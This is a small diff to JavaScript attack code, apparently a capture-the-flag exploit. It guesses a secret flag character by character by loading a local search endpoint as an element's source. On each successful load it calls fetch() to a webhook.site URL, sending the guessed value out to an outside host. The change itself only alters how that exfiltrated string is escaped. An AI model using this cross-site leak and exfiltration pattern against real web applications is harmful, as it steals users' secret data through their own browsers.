@@ -12,7 +12,7 @@
                     let curFlag = flag + curChar;
                     elem.src = `http://127.0.0.1:1337/api/entries/search?q=${encodeURIComponent(curFlag)}`;
                     elem.onload = () => {
-                        fetch(`https://webhook.site/ce587c88-e8e2-4397-9cb7-df2c22c5f8bb/${curFlag.replace('\\', '')}`);
+                        fetch(`https://webhook.site/ce587c88-e8e2-4397-9cb7-df2c22c5f8bb/${curFlag}`);
                         brute_force_flag(curFlag);
                     };
                     document.head.appendChild(elem);
